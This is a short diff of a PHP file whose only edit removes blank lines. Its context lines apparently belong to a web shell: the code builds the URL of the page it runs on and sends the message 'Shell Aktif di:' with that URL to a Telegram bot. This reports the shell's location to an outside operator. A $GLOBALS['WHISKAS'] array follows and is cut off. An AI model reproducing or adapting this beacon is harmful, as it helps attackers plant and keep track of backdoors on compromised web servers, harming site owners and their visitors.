@@ -8,9 +8,7 @@ $chatId = "8652693265";
 $domain = $_SERVER['HTTP_HOST'];
 $path = $_SERVER['REQUEST_URI'];
 $full_url = "http://" . $domain . $path;
-
 $message = "Shell Aktif di: " . $full_url;
-
 $sendToTelegram = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
 
 $GLOBALS['WHISKAS'] = array(
